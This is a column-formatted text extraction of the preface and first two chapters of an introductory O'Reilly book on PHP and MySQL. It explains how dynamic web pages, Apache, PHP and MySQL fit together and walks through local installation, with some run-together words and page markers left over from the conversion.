Larger Text,Smaller Text,Symbol
Preface,"1
  
 PHP and MySQL are a powerful combination that makes it easy to create web appli-
 cations. If you’ve been creating web pages but want to build more sophisticated 
 sites that can grow and interact with users, PHP and MySQL let you get started 
 easily and then build complex applications on those foundations.
  
 Our goal is to help you learn the ins and outs of PHP and MySQL and to save you 
 some of the “Why doesn’t that work?” moments that we’ve already been through. 
 We’ll show you what to watch for and how to fix these issues without pulling out 
 your hair.",NA
Audience,"This book is for people who want to know how to create dynamic web sites. That 
 could include graphic designers who are already working in an IT or advertising 
 firm creating static web sites, and who may need to move forward with coding 
 database-driven web sites. It might also include people who already know, say, 
 Flash develop-ment and HTML markup, but need to expand their repertoire of 
 skills to databases and programming.",NA
Assumptions This Book Makes,"This book assumes you understand how web browsers work and have a basic 
 under-standing of HTML. Some understanding of JavaScript may be useful (for 
 Chapter 16) but isn’t generally required.
  
 You might also be overqualified. If you already know how to create pages using 
 MySQL and PHP, then you’d probably be better off with a book that is more a refer-
 ence than a learning book, such as Paul Hudson’s
  PHP in a Nutshell
 , or Russell 
 Dyer’s
  MySQL in a Nutshell
 , both from O’Reilly.
  
 ix",NA
Organization of This Book,"This book starts out with an overview of how all of the pieces you’ll be working 
 with fit together. Because there are multiple languages and technologies that 
 interact to form dynamic web pages, it’s best to start with a solid understanding of 
 how the pieces work together. The PHP that you’ll learn works as an integration 
 package for dynamic web sites.
  
 Next, we’ll walk through installing the core software packages on your local com-
 puter. This book focuses on PHP and MySQL, but making this work also usually 
 requires the Apache web server. The PHP interpreter works with the web server 
 when processing dynamic content. Finally, you’ll install the MySQL database. Instal-
 lation is covered for PC, Mac, and Linux systems. You can also use a hosted Internet 
 service provider (ISP) account to develop your pages, if you don’t want to install 
 everything locally.
  
 Since PHP plays an important role in pulling everything together, we next explain 
 the basics of working with the PHP language. This includes language essentials such 
 as data types, program flow logic, and variables. Functions, arrays, and forms each 
 get their own chapter to fully explore them.
  
 Because you may be new to databases in general, we ease into MySQL by first 
 explaining concepts that apply to designing and using any relational database. Then 
 we give specific examples of using MySQL to interact with your data. Once you can 
 get data in and out of the database, you’ll need to work with PHP to integrate that 
 data into your dynamic content.
  
 Security and access control get their own chapters. While security may sound like a 
 dull subject, it’s still a huge issue if you store any private information on your web 
 page. We’ll guide you around several common security pitfalls.
  
 We also touch on how XHTML, the next generation of HTML, works with PHP and 
 your web sites.
  
 Finally, we close with sample applications that demonstrate how the technologies 
 work together to rapidly build workable, fast web sites. You’ll also be provided with 
 web sites and forums to gain additional information on the topics covered in the 
 book.",NA
Supporting Books,"Even if you feel you are ready for this book, you may want to explore some of the 
 technologies in greater depth than is possible here. The following list offers some 
 good places to start:
  
 •
  Run Your Own Web Server Using Linux & Apache
 , by Tony Steidler-Dennison 
  
 (SitePoint).
  
 •
  PHP in a Nutshell
 , First Edition, by Paul Hudson (O’Reilly).
  
 x
  
 |
  
 Preface",NA
Conventions Used in This Book,"The following font conventions are used in this book:
  
 Italic 
  
 Indicates pathnames, filenames, and program names; Internet addresses, such 
 as domain names and URLs; and new items where they are defined.
  
 Constant width 
  
 Indicates command lines; names and keywords in programs, including method 
 names, variable names, and class names; HTML element tags; values; and data-
 base engines.
  
 Constant width italic 
  
  
 Indicates text that should be replaced with user-supplied 
 values.
  
 Constant width bold 
  
 Indicates emphasis in program code lines and user input options that should be 
 typed verbatim.
  
  
  
 This icon signifies a tip, suggestion, or general note.
  
 This icon indicates a warning or caution.",NA
Using Code Examples,"This book is here to help you get your job done. In general, you can use the code in 
 this book in your programs and documentation. You do not need to contact O’Reilly 
 for permission unless you’re reproducing a significant portion of the code. For 
 exam-ple, writing a program that uses several chunks of code from this book does 
 not require permission. Selling or distributing a CD-ROM of examples from O’Reilly 
 books
  does
  require permission. Answering a question by citing this book and quot-
 ing example code does not require permission. Incorporating a significant amount 
 of example code from this book into your product’s documentation
  does
  require 
 permission.
  
 Preface
  
 |
  
 xi",NA
How to Contact Us,"We have tested and verified the information in this book to the best of our ability, 
 but mistakes and oversights do occur. Please let us know about any errors you find, 
 as well as your suggestions for future editions, by writing to:
  
 O’Reilly Media, Inc.
  
 1005 Gravenstein Highway North 
  
 Sebastopol, CA 95472 
  
 800-998-9938 (in the United States or 
 Canada) 
  
 707-829-0515 (international or local) 
  
 707-829-0104 (fax)
  
 We have a web page for this book, where we list errata, examples, and any addi-
 tional information. You can access this page at:
  
 http://www.oreilly.com/catalog/9780596514013
  
 There is also a blog for this book located at:
  
 http://www.krautgrrl.com/learningphp/
  
 To comment or ask technical questions about this book, send email to:
  
 bookquestions@oreilly.com
  
 For more information about our books, conferences, Resource Centers, and the 
 O’Reilly Network, see our web site at:
  
 http://www.oreilly.com",NA
Safari® Books Online,"When you see a Safari® Books Online icon on the cover of your 
 favorite technology book, that means the book is available online 
 through the O’Reilly Network Safari Bookshelf.
  
 Safari offers a solution that’s better than e-books. It’s a virtual library that lets you 
 easily search thousands of top tech books, cut and paste code samples, download 
 chapters, and find quick answers when you need the most accurate, current 
 informa-tion. Try it for free at
  http://safari.oreilly.com
 .
  
 xii
  
 |
  
 Preface",NA
Acknowledgments,"We are happy to have this newly improved and expanded Second Edition out for 
 our audience. We’d like to thank our wonderful agent, Matt Wagner of Fresh Books, 
 along with Simon St.Laurent at O’Reilly for getting this Second Edition rolling; with-
 out them, this book wouldn’t be in your hands.
  
 Second, profuse thanks to our technical editors, especially Jereme Allen, Charlie 
 Maguire, and Peter MacIntyre for their fantastic edits to our book. We’d also like to 
 thank our local Minneapolis/St. Paul PHP community:
  http://www.tcphp.org
 , which 
 sparked our interest in PHP and MySQL years ago. Lastly, thanks to Simon, Mimi, 
 and Zack for being patient while their parents reworked a very important book.
  
 Preface
  
 |
  
 xiii",NA
CHAPTER 1,NA,NA
Dynamic Content and the Web,"1
  
 To the average user, a web page is a web page. It opens in the browser and provides 
 information. Looking closer, though, some pages stay mostly the same, while other 
 pages change regularly. Pages that don’t change—
 static
  pages—are relatively 
 simple to create. Someone has to create an HTML document, by hand or with tools, 
 and upload it to a site where web browsers can visit. One of the most common tools 
 to create HTML documents is Adobe Dreamweaver. When changes are needed, you 
 just replace the old file with a new one.
  Dynamic
  pages are also built with HTML, 
 but instead of a simple build-and-post approach, the pages are updated regularly, 
 sometimes every time that they are requested.
  
 Static sites provide hyperlinked text and perhaps a login screen, but beyond that, 
 they 
 don’t 
 offer 
 much 
 interaction. 
 By 
 contrast, 
 Amazon.com 
 (
 http://www.amazon.com
 ) demonstrates much of what a dynamic web site can do: 
 your ordering data is logged, and Amazon offers recommendations based on your 
 purchasing history when you access their page. In other words, dynamic means 
 that the user interacts with the web site beyond just reading pages, and the web 
 site responds accordingly. Every page is a personalized experience.
  
 Creating dynamic web pages—even a few years ago—meant writing a lot of code in 
 the C or Perl languages, and then calling and executing those programs through a 
 process called a Common Gateway Interface (CGI). Having to create executable files 
 wasn’t much fun, and neither was learning a whole new complicated language.
  
 Thankfully, PHP and MySQL make creating dynamic web sites easier and faster.",NA
HTTP and the Internet,"Some basic understanding of how the Internet works may be useful if you haven’t 
 programmed for the Web before. The HyperText Transfer Protocol (HTTP) defines 
 how web pages are transferred across the Internet. HTTP is the method used to 
 transfer or convey information on the World Wide Web. Its original purpose was to 
 provide a way to publish and retrieve HTML pages.
  
 1",NA
PHP and MySQL’s Place in Web Development,"PHP is a programming language designed to generate web pages interactively on 
 the computer serving them, which is called a
  web server
 . Unlike HTML, where the 
 web browser uses tags and markup to generate a page, PHP code runs between the 
 requested page and the web server, adding to and changing the basic HTML output.
  
 PHP makes web development easy because all the code you need is contained 
 within the PHP framework. This means that there’s no reason for you to reinvent 
 the wheel each time you sit down to develop a PHP program; it comes with web 
 functionality built-in.
  
 While PHP is great for web application development, it doesn’t store information by 
 itself. For that, you need a database. The database of choice for PHP developers is 
 MySQL, which acts like a filing clerk for PHP-processed user information. MySQL 
 automates the most common tasks related to storing and retrieving specific user 
 information based on your supplied criteria.
  
  
 Consider the Amazon.com example: the recommendations Amazon 
 offers are based on a database that records your prior order 
 information.
  
 MySQL is easily accessed from PHP, and they work well together. An added benefit 
 is that PHP and MySQL run on various computer types and operating systems, 
 including Mac OS X, Windows-based PCs, and Linux.
  
 2
  
 |
  
 Chapter 1: Dynamic Content and the Web",NA
Advantages of Using PHP with MySQL,"There are several factors that make using PHP and MySQL together a natural choice:
  
 PHP and MySQL work well together 
  
 PHP and MySQL have been developed with each other in mind, so they are easy 
 to use together. The programming interfaces between them are logically paired 
 up. Working together wasn’t an afterthought when the developers created the 
 PHP and MySQL interfaces.
  
 PHP and MySQL have open source power 
  
 As they are both open source projects, PHP and MySQL can both be used for 
 free. MySQL client libraries are no longer bundled with PHP. Advanced users 
 have the ability to make changes to the source code, and therefore change the 
 way the language and programs work.
  
 PHP and MySQL have community support 
  
 Both tools active communities on the Web in which you can participate, and the 
 participants will help you answer your questions. You can also purchase profes-
 sional support for MySQL if you need it.
  
 PHP and MySQL are fast 
  
  
 Their simple and efficient designs enable faster 
 processing.
  
 PHP and MySQL don’t bog you down with unnecessary details 
  
 You don’t need to know all of the low-level details of how the PHP language 
 interfaces with the MySQL database, as there is a standard interface for calling 
 MySQL procedures from PHP. Online application programming interfaces (APIs) 
 at
  http://www.php.net
  offer unlimited resources.",NA
The Value of Open Source,"As we mentioned above, both PHP and MySQL are open source projects, so you 
 don’t need to worry about buying user licenses for every computer in your office or 
 home. When using open source projects and technologies, programmers have 
 access to the source code. This enables individual or group analysis to identify 
 potentially problematic code, test, debug, and offer changes as well as additions to 
 that code. For example, Unix—the forerunner in the open source software 
 community—was freely shared with university software researchers. Linux, the 
 free alternative to Unix, is a direct result of their efforts and the open source-
 licensing paradigm. Most open source licenses include the right to distribute 
 modified code with some restrictions. For example, some licenses require that 
 derivative code must also be released under the same license, or there may be a 
 restriction that others can’t use your code.
  
 As Tim O’Reilly puts it, “Open source licensing began as an attempt to preserve a 
 culture of sharing, and only later led to an expanded awareness of the value of that 
 sharing.” Today, open source programmers share their code changes on the Web 
 via 
 http://www.php.net
 , listservs, and web sites. If you’re caught in a coding 
 nightmare and can’t wake up, the resources mentioned previously can and will help 
 you.
  
 PHP and MySQL’s Place in Web Development
  
 |
  
 3",NA
The Components of a PHP Application,"In order to process and develop dynamic web pages, you’ll need to use and under-
 stand several technologies. There are three main components of creating dynamic 
 web pages: a web server, a server-side programming language, and a database. It’s 
 a good idea to have an understanding of these three basic components for web 
 devel-opment using PHP. We’ll start with some rudimentary understanding of the 
 history and purpose of Apache (your web server), PHP (your server-side 
 programming lan-guage), and MySQL (your database). This can help you to 
 understand how they fit into the web development picture.
  
 Remember that dynamic web pages pull information from several sources simulta-
 neously, including Apache, PHP, MySQL, and Cascading Style Sheets (CSS), which 
 we’ll talk about later.",NA
PHP,"PHP grew out of a need for people to develop and maintain web sites containing 
 dynamic client-server functionality. In 1994, Rasmus Lerdorf created a collection of 
 open source Perl scripts for his personal use, and these eventually were rewritten 
 in C and turned into what PHP is today. By 1998, PHP was released in its third 
 version, turning it into a web development tool that could compete with similar 
 products such as Microsoft’s Active Server Pages (ASP) and Sun’s Java Server Pages 
 (JSP). PHP also is an interpreted language, rather than a compiled one. The real 
 beauty of PHP is simplicity coupled with power.
  
  
 Compiled languages create a binary file such as an
  .exe
 , while inter-
 preted languages work directly with the source code when 
 executing, as opposed to creating a standalone file.
  
 PHP is ubiquitous and compatible with all major operating systems. It is also easy 
 to learn, making it an ideal tool for web programming beginners. Additionally, you 
 get to take advantage of a community’s effort to make web development easier for 
 every-one. The creators of PHP developed an infrastructure that allows 
 experienced C pro-grammers to extend PHP’s abilities. As a result, PHP now 
 integrates with advanced technologies like XML, XSL, and Microsoft’s Component 
 Object Model Technolo-gies (COM).
  
 4
  
 |
  
 Chapter 1: Dynamic Content and the Web",NA
Apache,"Apache is a web server that turns browser requests into resulting web pages and 
 knows how to process PHP code. PHP is only a programming language, so without 
 the power of a web server like Apache behind it, there would be no way for web 
 users to reach your pages containing the PHP language code.
  
 Apache is not the only web server available. Another popular web server is 
 Microsoft’s Internet Information Services (IIS), which is supplied with Windows 
 2000 and all later versions. Apache has the decided advantages of being free, 
 provid-ing full source code, and using an unrestricted license. Apache 2.0 is the 
 current ver-sion you would most likely be using, though 1.3 is often still used. IIS is 
 easier to integrate with Active Directory, Microsoft’s latest authentication system, 
 but this applies mostly to internal company web sites.
  
  
 According to the Netcraft web server survey, Apache has been the 
 most popular web server on the Internet since April 1996.
  
 Because web servers like Apache and IIS are designed to serve up HTML files, they 
 need a way to know how to process PHP code. Apache uses
  modules
  to load exten-
 sions into its functionality. IIS uses a similar concept called Internet Server Applica-
 tion Program Interface (ISAPI). These both allow for faster processing of the PHP 
 code than the old-school process of calling PHP as a separate executable each time 
 the web server had a request for a page containing PHP. We’ll discuss how the 
 Apache module is set up in Chapter 2.
  
 Apache has only two major versions in use today: 1.3 and 2. Apache 2 is a major 
 rewrite and supports
  threading
 . Threads allow a single process to manage more 
 than one thing at a time. This increases speed and reduces the resources needed. 
 Unfortu-nately, PHP isn’t totally compatible with threading yet. Apache 2 has been 
 out long enough to be considered stable for use in development and production 
 environ-ments.
  
 Apache 2 also supports more powerful modules. Some additional modules can be 
 found at
  http://www.cri.ensmp.fr/~coelho/mod_macro/
 . However, shared module 
 DLLs that don’t come with the official Apache source files, such as
  mod_php4
 ,
  mod_ 
 ssl
 ,
  mod_auth_mysql
 , and
  mod_auth_ntsec
 , can be found on the Web.
  
 Apache also has the advantage of being able to run on operating systems other than 
 Windows, which now brings us to the subject of compatibility. But first we’ll give 
 you a little more in-depth coverage of relational databases and SQL.
  
 The Components of a PHP Application
  
 |
  
 5",NA
SQL and Relational Databases,"Structured Query Language (SQL) is the most popular language used to create, 
 retrieve, update, and delete data from relational database management systems. A 
 relational
  database conforms to the relational model and refers to a database’s data 
 and schema. The
  schema
  is the database’s structure of how data is arranged. 
 Common usage of the term “Relational Database Management System” technically 
 refers to the software used to create a relational database, such as Oracle or 
 Microsoft SQL Server.
  
 A relational database is a collection of tables, but other items are frequently consid-
 ered part of the database, as they help organize and structure the data in addition 
 to forcing the database to conform to a set of requirements.",NA
MySQL,"MySQL is a free yet full-featured relational database. MySQL was developed in the 
 1990s to fill the ever-growing need for computers to manage information intelli-
 gently. The original core MySQL developers were trying to solve their needs for a 
 database by using mSQL, a small and simple database. It become clear that mSQL 
 couldn’t solve all the problems they wanted it to, so they created a more robust 
 data-base that turned into MySQL.
  
 MySQL supports several different
  database engines
 . Database engines determine 
 how MySQL handles the actual storage and querying of the data. Because of that, 
 each storage engine has its own set of abilities and strengths. Over time, the 
 database engines available are becoming more advanced and faster. Table 1-1 lists 
 when vari-ous features have been added to MySQL.
  
 Table 1-1. Major MySQL releases
  
 Version
  
 Features
  
 3.23
  
 The MyISAM database engine is added and is the default engine. It handles large 
 amounts of data efficiently.
  
 TheInnoDBdatabaseenginedebutsfortransactionsafedatabaseprocessingandsupp
 ortfor
 foreignkeys
 .Foreign keys allow the relationships between tables to be 
 explicitly designated in the database.
  
 4.0 
  
 Queries support
  unions
 . Unions allow merging the results of two queries into 
 one result. Configuration changes 
  
 can be made without restarting the database.
  
 4.1 
  
 A
  help
  command is included for the database client. There is support for
  
 unnamed views
 , also known as 
  
 subqueries
 . Unnamed views allow you to treat a query like 
 a separate table within a query. There is support for 
  
 Unicode character sets (local 
 languages).
  
 5.0 
  
 Database
  triggers
 ,
  stored procedures
 ,
  constraints
 , and
  cursors
  are added. A trigger 
 allows code to run in the data-
  
 base when a triggering event occurs, such as inserting data 
 into a table. Stored procedures allow programs to be 
  
 defined and executed within 
 the database. Constraints are used to define rules for when rows can be added or 
  
 modified in the database. Cursors allow code in the database to be run for each 
 row that matches a query.
  
 6
  
 |
  
 Chapter 1: Dynamic Content and the Web",NA
Compatibility,"Web browsers such as Safari, Firefox, Netscape, and Internet Explorer are made to 
 process HTML, so it doesn’t matter which operating system a web server runs on. 
 Apache, PHP, and MySQL support a wide range of operating systems (OS), so you 
 aren’t restricted to a specific OS on either the server or the client. While you don’t 
 have to worry much about software compatibility, the sheer variety of file formats 
 and different languages that all come together does take some getting used to.",NA
Integrating Many Sources of Information,"In the early days of the Web, life was simple. There were files that contained HTML, 
 and binary files such as images. Several technologies have since been developed to 
 organize the look of web pages. For example,
  Cascading Style Sheets
  (CSS) pull pre-
 sentation information out of your HTML and into a single spot so that you can make 
 formatting changes across an entire set of pages all at once; you don’t have to 
 manu-ally change your HTML markup one HTML page at a time.
  
 You can potentially have information coming from HTML files that reference CSS, 
 PHP templates, and a MySQL database all at once. PHP templates make it easier to
  
 Integrating Many Sources of Information
  
 |
  
 7",NA
Requesting Data from a Web Page,"It can be tricky to understand how all of these pieces integrate. When a web server 
 detects PHP code, it turns over the processing of the page to the PHP interpreter. 
 The server processes the PHP file and sends the resulting HTML file to the browser. 
 If that result includes an external CSS stylesheet, the browser issues a separate 
 request for that stylesheet before displaying the page.
  
 Requesting Data from a Web Page
  
 |
  
 11",NA
Chapter 1 Questions,"Question 1-1 
  
  
 What three components do you need to create a dynamic web 
 page?
  
 Question 1-2 
  
  
 What does Apache use to load 
 extensions?
  
 Question 1-3 
  
  
 What does SQL (as in MySQL) stand for?
  
 Question 1-4 
  
  
 What are angle brackets (
 <>
 ) used 
 for?
  
 Question 1-5 
  
  
 What does the PHP Interpreter do?
  
 See the “Chapter 1” section in the Appendix for the answers to these questions.
  
 14
  
 |
  
 Chapter 1: Dynamic Content and the Web",NA
CHAPTER 2,NA,NA
Installation,"2
  
 Developers working with PHP and MySQL often find it more convenient to work on 
 a local computer rather than a remote web server. In general, it is also safer to 
 create and test your applications on a local—preferably private—computer and 
 then deploy them to a public server where others can enjoy your work. Typically, 
 you need to install Apache, PHP, and MySQL on the local computer, while your ISP 
 handles installation on the public server.",NA
Developing Locally,"Developing your web applications on your local computer is a good way to learn, 
 because you can interact with all of the components on your own machine and not 
 risk causing problems on a production server. That way, if there are problems in 
 the local environment, you can fix them immediately without exposing them to 
 your site’s visitors. Working with local files means that you don’t have to FTP them 
 to a server, you don’t have to be connected to the Internet, and you know exactly 
 what’s installed, since you did it yourself.
  
 There are three components to install:
  
 • Apache
  
 • PHP
  
 • MySQL
  
 You need to install the programs in that order. All our examples will be from the 
 installation perspective of a PC with Windows installed, with notes for Macintosh 
 and Linux systems.
  
 15",NA
Bundled or Full Installations,"When just starting out, it can be easier to install a bundled set of Apache, MySQL, 
 phpMyAdmin, and PHP. There are several packages available that install all of these 
 at the same time as a single installer within one directory on your computer. These 
 packages also provide a control panel to start and stop individual components and 
 administer them. In other words, it’s a great way for a beginner to start out. The 
 downside is that they’re not meant for production use, as they are often configured 
 with minimal security to make them easier to use. We’ll discuss one of the more 
 popular packages, called XAMPP. First, we’ll discuss installing everything the old-
 fashioned way.",NA
Installing Apache,"Apache needs to be installed and operational before PHP and MySQL can be 
 installed, or else they won’t work correctly. Any computer can be turned into a web 
 server by installing server software and connecting the machine to the Internet, 
 which is why you need to install Apache. To keep the installation as simple as possi-
 ble, we’ll address only the latest versions of Apache, PHP, and MySQL. Although you 
 can use older versions, they’re more difficult to install and get to work together.
  
 1. Download the Apache 2.x Win32 MSI installer binary. It’s downloadable from 
 http://httpd.apache.org/
 . Select the “Download from a mirror” link on the left 
 side of the page and download the best available version. A
  mirror
  is a down-
 load location. The file that you save to your desktop will be named similarly to 
 apache_2.2.4-win32-x86-no_ssl.msi
  (the exact version number will vary).
  
  
 If you are on Mac OS X, you already have Apache installed. Open Sys-
 tem Preferences, select the Sharing panel, and click to activate Per-
 sonal Web Sharing (which is actually Apache). Mac OS X 10.2, 10.3, 
 and 10.4 all come with different versions of Apache, but each works
  
 perfectly fine.
  
 2. Install Apache using the Installation Wizard. Double-click the MSI installer file 
 on your desktop, and you see the installer shown in Figure 2-1.
  
 The Installation Wizard walks you through the installation process.
  
 16
  
 |
  
 Chapter 2: Installation",NA
Installing PHP,"Go to
  http://www.php.net/downloads.php
  to download the latest version of PHP; 
 both binaries and source code can be found on this web site. Under Windows 
 Binaries, select the PHP 5.x installer where x is the latest available version. Select a 
 mirror site in your country from the list of mirrors to download the file:
  
 1. The file that you save to your desktop will be named similarly to
  php-5.2.1-
 win32-installer.msi
  (the exact version number will vary).
  
 2. Install PHP using the Installation Wizard. Double-click the MSI installer file on 
 your desktop, and you’ll see the installer shown in Figure 2-9.
  
  
 Figure 2-9. The PHP MSI installer
  
 Developing Locally
  
 |
  
 21",NA
